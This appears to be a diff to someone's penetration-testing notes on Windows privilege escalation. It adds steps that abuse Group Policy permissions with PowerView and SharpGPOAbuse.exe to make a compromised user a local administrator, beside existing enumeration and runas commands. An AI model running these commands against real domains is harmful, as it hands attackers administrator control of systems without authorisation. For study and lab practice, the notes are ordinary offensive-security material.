@@ -195,7 +195,7 @@ Windows Privesc:
                 set
             whoami
             whoami /groups
-            Get-LocalUser (In PS)
+            Get-LocalUser (In PowerView)
             net user <username>
             Get-LocalGroup
             Get-LocalGroupMember <groupname>
@@ -228,6 +228,7 @@ Windows Privesc:
 
         Run Commands as differnt user ( when we already know password and we are running RDP):
             runas /user:backupadmin cmd
+        
         Or from cmd with:
             Invoke-RunasCs.ps1
             1. Download and Upload https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
@@ -244,6 +245,15 @@ Windows Privesc:
             schtasks /query /fo LIST /v
             schtasks /query /fo LIST /v /TN "Task Name"
             Get-ScheduledTask
+
+        If all privileges are enabled Check for Group Policies with PowerView (Most Liekly on DC):
+            Get-NetGPO
+            Get-GPO -Name "Default Domain Policy"
+            grab the ID
+            Get-GPPermission -Guid <id> -TargetType User -TargetName <user that u've compromised>
+            download SharpGPOAbuse.exe
+            .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+            gpupdate /force
 
 Cross compileing c program into binary for 64bit Windows in Kali
 
